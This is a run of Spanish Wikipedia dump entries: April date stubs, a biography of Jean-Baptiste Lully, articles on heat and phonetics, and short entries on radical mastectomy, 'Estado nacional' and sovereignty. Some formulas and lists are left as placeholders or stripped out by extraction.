El 7 de abril es el 97.º (nonagésimo séptimo) día del año en el calendario gregoriano y el 98.º en los años bisiestos. Quedan 268 días para finalizar el año.




















</doc>
<doc id="6277" url="https://es.wikipedia.org/wiki?curid=6277" title="9 de abril">
9 de abril

El 9 de abril es el 99.º (nonagésimo noveno) día del año en el calendario gregoriano y el 100.º en los años bisiestos. Quedan 266 días para finalizar el año.




























</doc>
<doc id="6278" url="https://es.wikipedia.org/wiki?curid=6278" title="10 de abril">
10 de abril

El 10 de abril es el 100.º (centésimo) día del año en el calendario gregoriano y el 101.º en los años bisiestos. Quedan 265 días para finalizar el año.








</doc>
<doc id="6279" url="https://es.wikipedia.org/wiki?curid=6279" title="11 de abril">
11 de abril

El 11 de abril es el 101.º (centésimo primer) día del año en el calendario gregoriano y el 102.º en los años bisiestos. Quedan 264 días para finalizar el año.








</doc>
<doc id="6282" url="https://es.wikipedia.org/wiki?curid=6282" title="Jean-Baptiste Lully">
Jean-Baptiste Lully

Jean-Baptiste Lully (Florencia, Italia, 28 de noviembre de 1632-París, 22 de marzo de 1687) fue un compositor, instrumentista y bailarín italiano, ligado a la figura y reinado de Luis XIV. Iniciador de la ópera en Francia y creador de la Tragedia Lírica, forma genuina que reúne el sentido estético francés con el ballet.

Nacido en Florencia, Italia, su nombre, antes de que se naturalizara francés, era Giovanni Battista Lulli. Sus padres fueron Lorenzo Lulli y Caterina. En 1638 muere su hermano mayor Vergini; en octubre de 1639 su hermana Margherita. Con siete años Jean-Baptiste queda como el único hijo de sus padres. Jean-Baptiste recibió su educación con un monje franciscano que le dio las primeras lecciones de música.
Se trasladó a Francia con 10 años tras llamar la atención del Caballero de Guisa. Allí, en marzo de 1643, entró como ayuda de cámara al servicio de Mademoiselle de Montpensier, que deseaba perfeccionar sus conocimientos de la lengua italiana.

A la edad de 13 años, ya manifestó dotes para la música y aprendió a tocar el violín. Luego se reveló como un excelente bailarín y entró a formar parte de la Grande Bande des Violons du Roi, compuesta por veinticuatro violines. En 1653, Lully bailó con el rey en el "Ballet de la Nuit".

En 1652, con 20 años, entró al servicio de Luis XIV como bailarín de ballet y violinista. Más tarde dirigió una de las orquestas reales y en 1662 fue nombrado director musical de la familia real. Sobresalía por entonces como violinista, director y compositor.

Obtuvo rápidamente la dirección de una nueva orquesta, La Bande des Petits Violons. Perfecto cortesano y hábil hombre de negocios, muy pronto se convirtió en el primer compositor de la corte, y sus arias y ballets consagraron su reputación. Apoyado por Luis XIV, llegó a ser compositor de cámara y finalmente Superintendente de la Música de Su Majestad.

Naturalizado francés en 1661, a los 29 años de edad se casó algunos meses después con Madeleine Lambert, con quien tuvo seis hijos, y cuyo padre era el director musical de Mademoiselle de Montpensier.

A partir de 1664, trabajó regularmente con Molière, con quien creó un nuevo género, la comedia ballet, sin renunciar por ello al ballet cortesano de manera definitiva.

Cortesano astuto, consiguió mantener el favor real a lo largo de toda su vida, lo que le permitió manejar la suerte de otros compositores franceses. Compuso ballets, como "Alcidiane" (1658), para la corte, que en ocasiones él mismo interpretaba ante el rey. En colaboración con Molière (Jean Baptiste Poquelin) compuso una serie de ballets cómicos, como "Les fâcheux" (1661). En 1672 consiguió mediante intrigas el puesto de director de la Académie royale de musique y a partir de ese momento volcó su atención en la ópera. El compositor ya había conseguido un título de nobleza y se había hecho con numerosas propiedades en París y en sus alrededores. Sus óperas (a las que denominó tragédie lyrique) estaban basadas en las tragedias clásicas de sus contemporáneos, los dramaturgos franceses Pierre Corneille y Jean Baptiste Racine. Excepto en "Psique" (1678), "Belerofonte" (1679) y "Acis y Galatea" (1686), su libretista fue el poeta Philippe Quinault. Desde el punto de vista musical, sus óperas son solemnes y majestuosas, con un énfasis especial en la claridad del texto y las inflexiones de la lengua francesa. Sus elaborados espectáculos de danza y los coros de gran majestuosidad tienen su raíz en el ballet de cour (ballet cortesano). Las óperas de Lully contrastan con el estilo italiano de ópera de la época, en donde se daba prioridad al lucimiento del cantante. Entre sus obras cabe citar "Perseo" (1682), "Amadís de Gaula" (1684) y la ya mencionada "Acis y Galatea".

En 1681, Lully alcanzó el cénit de su carrera al convertirse en secretario del rey. Murió por una gangrena en París, en 1687, a consecuencia de una herida que se hizo en el pie con su bastón de director de orquesta, una pesada barra de hierro que servía para llevar el compás golpeando el suelo con ella; esto le provocó una infección que acabó lentamente con su vida, ya que su pensamiento de ser bailarín impidió cortar su pierna para poder salvarle. La fama de Lully se debe principalmente a su contribución a la música religiosa y escénica.
Sus restos descansan en paz en la Basilique Notre Dame des Victoires en Paris. Es curioso porque se encuentran sobre el arco de una puerta, del lado izquierdo de la basílica. Casi pasa desapercibido.

Algunas de sus primeras obras, de la época en que era sobre todo violinista, y posteriormente compositor de bailes y de aires en estilo italiano son:


Vienen después las comédies ballets, realizadas en colaboración con Molière:


En la última etapa de su vida, compuso trece «tragédies lyriques», la mayoría sobre textos de Philippe Quinault:

También compuso una "pastoral heroica":




</doc>
<doc id="6283" url="https://es.wikipedia.org/wiki?curid=6283" title="Calor">
Calor

Se denomina calor a la energía en tránsito que se reconoce solo cuando se cruza la frontera de un sistema termodinámico. Una vez dentro del sistema, o en los alrededores, si la transferencia es de dentro hacia afuera, el calor transferido se vuelve parte de la energía interna del sistema o de los alrededores, según su caso. El término calor, por tanto, se debe de entender como "transferencia de calor" y solo ocurre cuando hay diferencia de temperatura y en dirección de mayor a menor. De ello se deduce que no hay transferencia de calor entre dos sistemas que se encuentran a la misma temperatura.

A menudo en el habla coloquial se usan expresiones como: "Cantidad de calor de un cuerpo" o "ganancia de calor" y se hace porque no producen ningún malentendido y quizás porque no hay ninguna alternativa técnica que sea tan intuitiva, pero en un sentido técnico son incorrectas. El calor, visto desde la física, "no se tiene", el calor es una "transferencia". Lo que tiene un cuerpo, es energía térmica, mejor aún, si se considera el cuerpo como un sistema termodinámico, la energía total del sistema tiene dos formas: "macroscópica" y "microscópica". La energía macroscópica es la que tiene el sistema con referencia a un origen exterior, como la energía cinética y la potencial. La microscópica es su grado de actividad molecular, que es independiente del sistema de referencia externo y es lo que se conoce como Energía interna del sistema y se representa por formula_1.

Las moléculas de un sistema se agitan con cierta velocidad, además giran y vibran de manera irregular y todo este movimiento les confiere una energía cinética que es la parte de la energía interna que es energía sensible, porque la velocidad promedio de las moléculas es proporcional a la temperatura, que es lo que podemos percibir. Pero también las moléculas están unidas por fuerzas de atracción que son más fuertes en los sólidos, disminuyen en los líquidos y aún más en los gases, de forma que un sistema en estado gaseoso implica una energía que ha sido necesaria para vencer las fuerzas intermoleculares. Esta energía que tiene que ver con la fase en que está el sistema, se llama "energía latente". Los átomos están unidos por enlaces que se forman y se destruyen en las reacciones químicas. La energía interna asociada con los enlaces atómicos, es la "energía química". Y por fin, las fuerzas de atracción en el núcleo de los átomos constituye la "energía nuclear", que se libera en las reacciones nucleares. Todas estas formas de energía, se almacenan en el interior del sistema y conforman su energía interna.

Pero hay formas de energía que no se pueden almacenar, que solo aparecen cuando hay interacción y constituyen lo que llamamos la energía ganada o perdida por el sistema. Estas formas de energía, son la Transferencia de calor y el Trabajo. Cuando el origen o la fuerza motriz de la interacción es una diferencia de temperatura, decimos que es calor, en caso contrario es trabajo.

Resumiendo, es muy común referirse a la energía sensible y latente como calor y está bien coloquialmente, pero en realidad es energía térmica, que es muy distinta de la transferencia de calor.

La primera referencia formal sobre la importancia del fuego se encuentra en Heráclito (540 a. C.-475 a. C.), quien sostenía que el fuego era el origen primordial de la materia.

Para Anaxímenes lo caliente y lo frío son estados comunes de la materia. Consideraba que lo comprimido y condensado era frío, y que lo raro y “laxo” era caliente, por tanto, según él, la ‘‘rarefacción’’ daba cuenta del proceso mediante el cual se calentaban las cosas, hasta quedar convertidas en vapor.

Aristóteles (384 a. C.-322 a. C.), agregó dos pares de cualidades fundamentales: caliente y frío, seco y húmedo. La razón por la cual un cuerpo tenía cierta temperatura, venía dada por las cantidades que en él se encontraban estas dos cualidades fundamentales.

Galeno (129-199) propuso una escala cualitativa que costaba de cuatro estados de calor y cuatro de frío, el punto neutro se obtenía agregando cuatro partes de agua hirviendo y cuatro partes de hielo.

Estas ideas se mantuvieron durante más de 23 siglos. Es curioso observar, que en este período ya se apreciaba que algunos de los fenómenos físicos, como la dilatación de sólidos y líquidos, y la expansión térmica del aire y el vapor, dependían del calor, pero no se prestaba atención a las temperaturas porque no eran parte de las cualidades referidas en la física aristotélica.

Las ideas de Aristóteles comienzan a ser cuestionadas a mediados del siglo XVI, cuando se propone la existencia de una quintaesencia de la materia, la existencia de un agente universal responsable de todas las reacciones químicas. Robert Boyle (1627-1691), negó al fuego todo carácter corpóreo y consideró que debía existir cierta unidad de la materia, lo que implicaba que debería estar compuesta por corpúsculos.

Mientras, en el siglo XVII y los primeros años del XVIII, se originaron discusiones sobre la estructura de la materia y ocurrió otro acontecimiento importante en la historia del calor, Georg Stahl (1660-1734) enuncia la teoría del flogisto. Este no debe ser confundido con el fuego material, el que se manifiesta en la llama y en el calor cuando se producen combustiones, sino que es un elemento inaccesible que poseen todos los cuerpos combustibles.

En el transcurso del siglo XVII se oponen dos teorías sobre el calor, la del flogisto, y la que defendían los seguidores de los atomistas griegos, quienes admitían la corporeidad del fuego, considerando que éste se constituía por partículas pequeñas, ligeras y sutiles, que tenían a su vez una enorme movilidad para penetrar en la materia en sus diferentes estados, capaces de operar simplemente con su presencia en forma de fluido imponderable, el calórico. Entre 1775 y 1787 Lavoisier elaboró una teoría de los gases, en las que introducía el principio del calórico. En este periodo surgía el concepto de temperatura y empezaron a construirse termómetros, para medir la frialdad de las cosas. Joseph Black (1728-1799) utilizó estos termómetros para estudiar el calor, observando cómo las diferentes sustancias que se encontraban a desiguales temperaturas tendían a llegar a un equilibrio cuando se les ponía en contacto.

En 1798 Benjamin Thompson, conde de Rumford, observó en Baviera, que al perforar cañones, la cantidad de calor que se obtenía dependía del estado del taladro y llegó a la conclusión de que el calor no era un fluido, sino una forma de movimiento. Dedujo la posibilidad de generar por rozamiento una cantidad ilimitada de calor, ya que el calor generado era aproximadamente proporcional al trabajo realizado, hecho que no era fácilmente argumentable con la teoría del calórico. En 1812 Humphry Davy confirmó la presunción anterior. Esta idea culmina con los trabajos del médico y físico Julio R. von Mayer en 1842 y posterior y definitivamente en 1850 con James Prescott Joule, que establecen que el calor y el trabajo no son más que manifestaciones de la energía térmica, la cual puede ser convertida en un porcentaje en trabajo, mientras que el trabajo puede ser totalmente convertido en calor.

Finalmente se comprobó que el calor no podía ser entendido como una sustancia material, sino que es una forma de energía. Las medidas del equivalente mecánico del calor señalaron el fin de la teoría del calórico. De todo esto surge la termodinámica y de ella la máquina térmica. En la misma época en que se inició la termodinámica, estaba desarrollándose la teoría molecular de la materia, que permite formarse una idea coherente del calor y de los fenómenos que intervienen. La teoría cinética de los gases explicaba muchos de los fenómenos que por medio de la teoría del calórico no podían ser explicados.

El calor específico es un parámetro que depende del material y relaciona el calor que se proporciona a una masa determinada de una sustancia con el incremento de temperatura:
^{T_{\mathrm f}} c \, \mathrm dT </math>
donde:
Las unidades de calor específico son formula_8 El calor específico de un material depende de su temperatura; no obstante, en muchos procesos termodinámicos su variación es tan pequeña que puede considerarse que el calor específico es constante.

Si se representa en un gráfico el calentamiento de un líquido llevando las cantidades de calor por unidad de masa formula_9 como ordenadas y las temperaturas formula_10 como abcisas. Entre dos temperaturas cualesquiera, el calor específico medio se expresa:

En la que formula_11 es la cantidad de calor que la sustancia recibe o cede entre las temperaturas formula_12 y formula_13. Sin embargo, el calor específico verdadero para formula_14 será:

El calor específico verdadero está dado por la variación de la cantidad de calor intercambiado por unidad de masa con respecto a la temperatura, o gráficamente, por la pendiente de la tangente geométrica en el punto de la curva de estado. Se puede ver en la figura, la diferencia entre los calores específicos verdaderos, representados por las pendientes de las tangentes a la curva y los calores específicos medios entre dos temperaturas, representados por la pendiente de la cuerda que une ambos puntos.

Para la mayoría de los cuerpos, el calor específico aumenta con la temperatura y la diferencia entre valores medios y verdaderos es pequeña, siempre que la variación de temperatura sea también pequeña. Para el agua, la curva q-t es prácticamente una recta, lo cual indica que su calor específico se mantiene, dentro de ciertos límites, prácticamente constante, normalmente se toma como 4186 kJ/kg.

Con frecuencia es muy útil hablar de calor específico molar denotado por c, y definido como la cantidad de energía necesaria para elevar la temperatura de un mol de una sustancia en 1 grado es decir, está definida por:
</math>
donde "n" indica la cantidad de moles en la sustancia presente.

La capacidad calorífica de una sustancia es una magnitud que indica la mayor o menor dificultad que presenta dicha sustancia para experimentar cambios de temperatura bajo el suministro de calor. Se denota por formula_15, se mide en formula_16, y se define como:

Dado que:
\Longrightarrow C = mc</math>
De igual forma se puede definir la capacidad calorífica molar como:

En la naturaleza existen tres estados usuales de la materia: sólido, líquido y gaseoso. Al aplicarle calor a una sustancia, ésta puede cambiar de un estado a otro. A estos procesos se les conoce como cambios de fase. Los posibles cambios de fase son:

Que un cuerpo sólido puede estar en equilibrio térmico con un líquido o un gas, o que un líquido y un gas pueden estar en equilibrio térmico entre sí, en una amplia gama de temperaturas, es algo normal y frecuente. Pero lo que no es tan normal es que dos fases o estados de agregación distintos de una misma sustancia, puedan estar en equilibrio térmico entre sí, naturalmente en circunstancias apropiadas.

Un sistema que consiste en formas sólida y líquida de determinada sustancia, a una presión constante dada, puede estar en equilibrio térmico, pero únicamente a una temperatura llamada punto de fusión simbolizado a veces como formula_17. A esta temperatura, todo el calor agregado se invierte en fundir el material mientras quede una partícula sólida, sin que haya un cambio significativo de su temperatura. La cantidad de energía agregada, se llama calor de fusión, calor latente de fusión o entalpía de fusión, y es diferente para cada sustancia. Se denota por formula_18.

Para pasar de líquido a sólido se necesita la misma cantidad de energía, por ello el calor de fusión representa la energía necesaria para cambiar del estado sólido al líquido, y viceversa.

De manera similar, un líquido y un vapor de una misma sustancia pueden estar en equilibrio térmico a una temperatura llamada punto de ebullición simbolizado por formula_19. El calor necesario para evaporar una sustancia en estado líquido ( o condensar una sustancia en estado de vapor ) se llama calor de ebullición o calor latente de ebullición o entalpía de ebullición, y se mide en las mismas unidades que el calor latente de fusión. Se denota por formula_20.

En la siguiente tabla se muestran algunos valores de los puntos de fusión y ebullición, y los calores latentes de fusión y evaporación de algunas sustancias:

En general, se admiten tres formas distintas de transmitir el calor: por conducción, por convección y por radiación. En rigor, solo la conducción y la radiación son formas de transmisión del calor, que para producirse dependen exclusivamente de la existencia de un desequilibrio térmico. El caso de la convección depende además del transporte mecánico de masa, sin embargo como sigue habiendo una transferencia de calor desde una zona de mayor temperatura a otra de temperatura inferior, se adopta la expresión transmisión de calor por convección.


La transmisión simple, es decir, debida exclusivamente a una de las tres formas es en la práctica inexistente y se produce siempre en forma simultánea, al menos por la combinación de dos de las formas de transmisión y muy a menudo por las tres.

Si se tiene un cuerpo en equilibrio termodinámico y se le deje en un medio que tiene una temperatura diferente, se produce una transferencia de energía entre el cuerpo y los alrededores hasta que se alcanza el equilibrio térmico, es decir, hasta que ambos están a la misma temperatura, en cuyo momento cesa la transferencia. Se dice que la energía se ha transferido en forma de calor.
La termodinámica estudia los estados de equilibrio y nos permite por la primera ley, determinar la diferencia de calor entre el estado 1 y el estado 2, tanto del cuerpo, como del medio en que se le sumergió. Si se admite que no ha habido más interacción que la debida a la diferencia de temperatura, la variación de energía interna del cuerpo y del medio son iguales y tanto una como la otra, informan sobre la cantidad de calor necesaria para pasar del estado 1 al 2, pero no nos dicen nada de cómo ha sido el flujo de calor entre ambos estados, ni cuál ha sido el tiempo necesario para la transferencia.

Como forma de energía, el calor tiene unidades de energía, por lo que si nos atenemos al Sistema Internacional de Unidades, se medirá en Julios formula_22. Teniendo en cuenta que esta unidad es muy pequeña y que la unidad de masa es el kg, se toma normalmente el kilojulio formula_23, que definido como calor sería:

Cuando es necesario conocer el flujo de calor o cantidad de calor transferido por unidad de tiempo, lo que se busca es formula_24 y se medirá en formula_25, es decir, en formula_26.
El cálculo del flujo de calor y de sus modos de transmisión no corresponden a la termodinámica, sino a otra parte de la física que es la "Transferencia de calor".

El calor es una magnitud con dirección, por tanto es necesario darle un signo para completar la información. No hay un acuerdo total sobre el signo convencional, pero el más aceptado es:

Para determinar de manera directa el calor que se pone de manifiesto en un proceso de laboratorio, se suele emplear un calorímetro. En esencia se trata de un recipiente que contendrá el líquido en el que se va a estudiar la variación de energía por transferencia de calor, cuya envolvente debe estar perfectamente aislada para garantizar que el proceso se acerque lo más posible al adiabático.

La termodinámica informa de transferencia de calor de un proceso, sin considerar el mecanismo de flujo de calor ni el tiempo necesario para efectuar la transferencia. Un estudio termodinámico determina cuánto calor debe transferirse para que se realice el paso de un estado a otro, apoyándose en el Primer principio o principio de conservación de la energía. Desde un punto de vista de la ingeniería, el problema clave es calcular la velocidad de transferencia de calor para una diferencia de temperatura determinada. La Termodinámica trata de los estados de equilibrio y de los cambios que ocurren entre un estado de equilibrio y otro. La Transferencia de calor sin embargo se ocupa de los fenómenos que se producen a partir de que existe un desequilibrio térmico y por tanto, exige una condición de no equilibrio. En consecuencia, el estudio de la transferencia de calor no puede basarse sólo en los principios de la termodinámica, sin embargo estos y cualquier ley física que tenga que ser satisfecha por un proceso, proporcionan ecuaciones que pueden utilizarse en el análisis.

La forma de aplicar la primera ley de la termodinámica es establecer un "volumen de control" que es una región fija del espacio limitada por una "superficie de control" y a través de la cual puede pasar calor, trabajo y masa. A partir de ahí se puede realizar un balance de energía:

Anteriormente mencionamos que el análisis termodinámico no se ocupa de la velocidad de la transferencia de calor en una dirección pero se puede decir que este parámetro depende de la magnitud del gradiente de temperatura, o diferencia de temperatura por unidad de longitud, o la razón o relación de cambio de la temperatura en esa dirección. A mayor gradiente de temperatura, mayor es la velocidad de transferencia de calor.

Los problemas de capacidad nominal se ocupan de la determinación de la velocidad de transferencia de calor en un sistema existente con una diferencia dada de temperatura. Los problemas de dimensionamiento, se ocupan de la determinación del tamaño de un sistema, con el fin de transferir calor a una velocidad determinada con una diferencia dada de la temperatura. Un proceso o un equipo de transferencia de calor puede ser analizado de forma experimental o de forma analítica. El procedimiento experimental tiene la ventaja de tratar con el sistema físico real y, gracias a ello, la cantidad deseada se determina mediante medición, dentro de los límites del error experimental. El procedimiento analítico tiene la ventaja de que es rápido y barato, pero los resultados obtenidos dependen de la exactitud de las hipótesis e idealizaciones establecidas en el análisis. En los estudios de transferencia de calor a menudo se logra una buena aproximación reduciendo, mediante el análisis, las opciones a solo unas cuantas y, a continuación, verificando los hallazgos experimentalmente.

Intentar cuantificar calor en el sentido en que lo usamos coloquial y cotidianamente, es más complicado de lo que parece, ya que ello depende de muchas más variables y sobre todo más impredecibles de las que se han apuntado hasta ahora. Empezando por el país, zona, clima, pasando por la luminosidad o el color predominante y hasta el sexo y la situación anímica del individuo pueden influir en la "sensación térmica".

Generalmente en la mayoría de los países, se habla ya de calor cuando la temperatura supera los 26°C en cualquier hora del día, aunque varía mucho según la estación del año. Por ejemplo, 20°C en verano es considerado una temperatura fresca, mientras que en invierno, esta temperatura es considerada templada o cálida.

El fenómeno "ola de calor" se anuncia cuando las temperaturas diurnas superan los 32°C y las nocturnas (o al amanecer) no bajan de los 23°C durante tres días. Es común en casi todo tipo de climas en época veraniega, a excepción de los países cerca de los polos, donde es muy infrecuente o casi nulo, y se hace más frecuente a medida que los países están más cerca de los trópicos. Esta denominación de ola de calor, no quiere decir necesariamente calor excesivo ni temperaturas inusuales para la estación, sino que pretende alertar sobre consecuencias perjudiciales en personas o colectivos vulnerables.

Se tiene una sensación de más calor cuando hay más humedad en el ambiente. Por ejemplo, una temperatura de 30°C, con humedad ambiental del 10 %, se sentirá como si el ambiente fuese de solo 28°C. Pero con humedad ambiental del 90 %, se sentirá como si el ambiente fuese de 40°C.




</doc>
<doc id="6286" url="https://es.wikipedia.org/wiki?curid=6286" title="Fonética">
Fonética

La fonética (del griego φωνή "fōnḗ" "sonido" o "voz") es el estudio de los sonidos físicos del discurso humano. Es la rama de la lingüística que estudia la producción y percepción de los sonidos de una lengua con respecto a sus manifestaciones "físicas". Sus principales ramas son: fonética articulatoria, fonética acústica y fonética auditiva o perceptiva. Desde otro punto de vista, también se habla de la fonética experimental como rama aparte.

La fonética experimental son las propiedades acústicas y físicas de los sonidos del habla, reuniendo y cuantificando los datos sobre la emisión y la producción de las ondas sonoras que configuran el sonido articulado. Utiliza instrumentos como el espectrógrafo, el nasómetro, el glotógrafo, el palatógrafo, etc., que muestran bien sea las ondas sonoras del habla provenientes de la boca o de la nariz o de la laringe, ya descompuestas, o las distintas zonas del paladar donde la lengua ha tocado El conjunto de los datos analizados al medir los sonidos, depende únicamente de la precisión del instrumental, así como de otros conocimientos conexos. En los estudios experimentales, se parte del habla de varios informantes y se utilizan medios estadísticos para establecer las tendencias generales en la naturaleza de los sonidos.

Gracias a la fonética experimental se sabe que la mayoría de los sonidos, en especial las vocales, están constituidos por combinaciones de unas pocas frecuencias, los llamados formantes, que permiten al oído reconocer dicho sonido. La existencia de formantes está relacionada con el hecho de que dichos sonidos son de hecho ondas sonoras. Otros sonidos como las fricativas carecen de formantes y presentan una combinación de ondas aperiódicas en una banda amplia de frecuencias.

Es la que estudia los sonidos de una lengua desde el punto de vista fisiológico; es decir, describe qué órganos orales intervienen en su producción, en qué posición se encuentran y cómo esas posiciones varían los distintos caminos que puede seguir el aire cuando sale por la boca, nariz, o garganta, para que se produzcan sonidos diferentes. No se ocupa de todas las actividades que intervienen en la producción de un sonido, sino que selecciona sólo las que tienen que ver con el lugar y la forma de articulación. Los símbolos fonéticos y sus definiciones articulatorias son las descripciones abreviadas de tales actividades. Los símbolos fonéticos que se usan más frecuentemente son los adoptados por la Asociación Fonética Internacional en el alfabeto fonético internacional (A.F.I.) que se escriben entre corchetes.

Los órganos que intervienen en la articulación móviles los labios, la mandíbula, la lengua y las cuerdas vocales, que a veces reciben el nombre de órganos articulatorios. Con su ayuda el hablante modifica la salida del aire que procede de los pulmones. Son fijos los dientes, los alveolos, el paladar y el velo del paladar. Los sonidos se producen cuando se ponen en contacto dos órganos articulatorios, por ejemplo el bilabial (p), que exige el contacto entre los dos labios; también cuando se ponen en contacto un órgano fijo y otro articulatorio, y el sonido se nombra con los órganos que producen la juntura, o punto de articulación, como por ejemplo el sonido labiodental (f) que exige el contacto entre el labio inferior y los incisivos superiores. Cuando es la lengua el órgano móvil no se hace referencia a ella en la denominación del sonido. Así, el sonido (t), que se produce cuando la lengua toca la parte posterior de los incisivos superiores, se llama dental.

El modo de articulación se determina por la disposición de los órganos móviles en la cavidad bucal y cómo impiden o dejan libre el paso del aire. Esta acción puede consistir en la interrupción instantánea y completa del paso del aire para las implosivas; en dejar abierto el paso nasal, pero interrumpido el oral para las nasales; no es básicamente lo mismo producir un contacto con la lengua, pero dejar libre el paso del aire a uno y otro lado para las laterales; o producir una leve interrupción primero y dejar el paso libre después para las africadas; o permitir el paso del aire por un paso estrecho por el que el aire pasa rozando para las fricativas, y permitir el paso libre del aire por el centro de la lengua sin fricción alguna para las vocales.

Se emiten diferentes clases de vocales según varíe la posición de la lengua, tanto a partir de su eje vertical (alta, media y baja), como a partir de su eje horizontal (anterior, central y posterior). Por ejemplo, en español son vocales altas las vocales de la palabra "huir"; es decir, la [i] y la [u]. Son vocales medias la [e] y la [o]; es decir, las vocales de la palabra "pero" y "es" vocal baja la [a] de la palabra "va". Así, la lengua va de abajo arriba para pronunciar las dos vocales seguidas de la palabra "aire", pero desciende a una posición media para pronunciar su última vocal. Hace el camino contrario de arriba abajo para pronunciar "puerta". Son vocales anteriores del español la [i] y la [e]; es decir, las vocales seguidas de la palabra "piel"; las vocales posteriores son la [o] y la [u]; es decir, las vocales de la palabra "muro"; la [a] es la vocal central. La lengua se mueve de atrás hacia adelante para emitir las vocales de la palabra "totales", y hace el camino contrario para emitir las vocales de la palabra "piélago". Las posiciones que mantiene la lengua para emitir las vocales u, i y a constituyen los vértices del llamado esquema vocálico uai.

Es el estudio de la fonética desde el punto de vista de las ondas sonoras. Se ocupa de la medición científica de las ondas de sonido que se crean en el aire cuando hablamos. Así como a los fonemas les atribuimos unos rasgos articulatorios, a los sonidos les podremos atribuir unos rasgos acústicos: vocálico/no vocálico y consonántico/no consonántico, compacto/difuso sonoro/sordo, nasal/oral, intercepto/continuo, estridente/mate, grave/agudo. Estas mediciones se reflejan en espectrogramas, en los que quedan reflejados los distintos formantes en que se descomponen los sonidos.

La fonética auditiva es una de las tres ramas básicas de la fonética, junto a la fonética articulatoria y la acústica, que estudia el sonido desde el punto de vista del receptor, es decir, estudia los mecanismos de la percepción del sonido.

La fonética auditiva, también denominada fonética perceptiva, "trata de la percepción a través del oído de los sonidos del habla" (George Yule). Considera la fonética desde el punto de vista del oyente. Estudia la manera cómo el oído reacciona ante las ondas sonoras (audición) así como la interpretación de tales ondas (percepción).

El oído es un dispositivo que tiene como misión recoger la energía, que lleva una onda acústica, en el tímpano y convertirla en impulsos nerviosos. Consta de tres partes: oído externo, oído medio y oído interno.

El conjunto de sonidos alófonos fonéticamente distintos de una lengua puede ser muy amplio, sin embargo, desde el punto de vista lingüístico no todos estos sonidos deben ser considerados independientes. De hecho la fonología aduce razones estructurales por las cuales deben ser considerados "equivalentes" o simples variantes de una entidad más abstracta llamada fonema. De hecho un fonema puede ser entendido como una clase de equivalencia de sonidos. 

Los fonemas están configurados también por unidades mínimas que los diferencian entre sí y son los llamados rasgos distintivos. La única diferencia que existe entre el fonema /p/ que corresponde a una consonante bilabial, oclusiva, sorda y el fonema /b/ que corresponde a una consonante bilabial, oclusiva sonora, es su sonoridad: sorda la primera, frente a la segunda que es sonora. No siempre se mantienen como fonemas distintos las diferencias que proceden de un solo rasgo distintivo, por ejemplo la primera <"d"> de la palabra <"dedo"> corresponde a una consonante dental oclusiva sonora [d], y la segunda es dental fricativa sonora [ð]. En este caso no estamos ante dos fonemas sino ante dos valores del mismo fonema.

A veces dos fonemas diferentes en una lengua dada son el mismo en otra, por ejemplo el español mantiene la diferencia fonética y fonológica entre los sonidos [r] y [l], pero el japonés no. 

De acuerdo con todo esto hay que distinguir entre sonidos (fonos), fonemas y letras (grafemas), aunque existen muchas coincidencias también hay desacuerdos muy importantes que apoyan esta diferencia. El fonema es un concepto mental, el fono es descriptible en términos de fonética articulatoria y acústica y la escritura es un sistema convencional para representar el nivel fonológico. Sin embargo, la escritura basada generalmente en grafemas o "letras" generalmente no es una representación en la que cada grafema corresponda a un fonema. Por ejemplo, la letra <"v"> del español actual corresponde al fonema /b/ que es una consonante bilabial, oclusiva, sonora; pero el fonema /v/ que corresponde a una consonante labiodental, fricativa, sonora ha desaparecido en el sistema fonético actual, sobre el que se discute si estuvo presente en el castellano antiguo. Además hay letras que no representan fonema alguno como es el caso de la letra <h> que es muda en nuestra lengua. La escribimos como recuerdo histórico de una aspiración o de una <"f"> inicial del latín, pero no tiene valor fonético. Por otro lado, algunas letras representan varios sonidos, como la <"c">: [θ] y [k] en España, y [s] y [k] en Hispanoamérica, zonas de Andalucía y Canarias.

Estudiando la comunicación y su proceso se puede captar mejor dónde y cuándo interviene cada área fonética. Dubois indica que la comunicación "es el proceso en cuyo transcurso la significación que un interlocutor asocia a los sonidos es la misma que la que el oyente asocia a esos mismos sonidos".

El proceso de comunicación tiene seis elementos fundamentales: emisor, receptor, código, mensaje, canal y fenómenos extralingüísticos. La articulación, que es la última etapa del mensaje en el emisor, la estudia la la llamada fonética articulatoria. Se ha avanzado mucho en el área acústica. Esta pertenece al dominio de la física, ya que el fenómeno del sonido es un hecho puramente físico, en la etapa que va de la boca del emisor al oído del receptor. La fonética auditiva estudia el comportamiento de la onda sonora en el oído, pues se sabe que hasta el oído interno continúa estando la onda sonora; a partir del órgano de Corti, que conecta con el nervio auditivo, ya no existirán ondas sonoras, sino solo impulsos nerviosos.

Por tanto, la fonética articulatoria se relaciona con el emisor del mensaje. Este se transmite por un canal en forma de ondas sonoras (fonética acústica). Y la fonética auditiva se asocia al receptor del mensaje.
Con la fonética articulatoria el emisor codifica el mensaje; con la fonética auditiva el receptor descodifica dicho mensaje. 

Aunque se hable de tres fonéticas, no hay que pensar que son tres aspectos separados. La fonética es una sola. Esas tres partes son tres puntos de vista del mismo fenómeno. En cada momento se podrá adoptar el punto de vista más adecuado para describir un fenómeno, pero forzosamente esa perspectiva estará relacionada con los otros dos aspectos. De hecho, la onda sonora, aunque haya sido situada fuera del emisor y del receptor, se origina en el primero y es recibida por el segundo.





</doc>
<doc id="6287" url="https://es.wikipedia.org/wiki?curid=6287" title="Mastectomía radical">
Mastectomía radical

La extirpación de una mama completa se llama mastectomía. La extirpación de la mama completa acompañada de los ganglios linfáticos de la axila y de porciones variables de los músculos pectorales se llama mastectomía radical.

En la mastectomia radical clásica también se extirpan los músculos pectorales mayor y menor. Este tipo de mastectomia es también conocida como operación o mastectomia de Halsted, en honor de William Stewart Halsted, el cirujano estadounidense que la popularizó. 

En la mastectomía radical modificada se conservan los músculos pectorales o como máximo se extirpa exclusivamente el pectoral menor, conservando el mayor. En el momento actual es el tipo de mastectomia mayormente practicada.


</doc>
<doc id="6293" url="https://es.wikipedia.org/wiki?curid=6293" title="Estado nacional">
Estado nacional

Estado nacional puede referirse a:


</doc>
<doc id="6294" url="https://es.wikipedia.org/wiki?curid=6294" title="Soberanía">
Soberanía

La soberanía es el poder político supremo que corresponde a un Estado independiente, sin ninguna interferencia de fuentes o cuerpos externos. En teoría política, la soberanía es un término sustantivo que designa la autoridad suprema que posee el poder último e inapelable sobre algún sistema de gobierno.

Etimológicamente, la palabra soberanía proviene de la voz latina “super omnia”, que significa "sobre todo" o "poder supremo", que también tiene como sinónimo a la palabra latina "principatus", que proviene de la voz latina "primus inter pares", que significa "primero entre pares" o "principal".

Según la famosa definición de soberanía de Carl Schmitt, el soberano es el que decide sobre el estado de excepción:

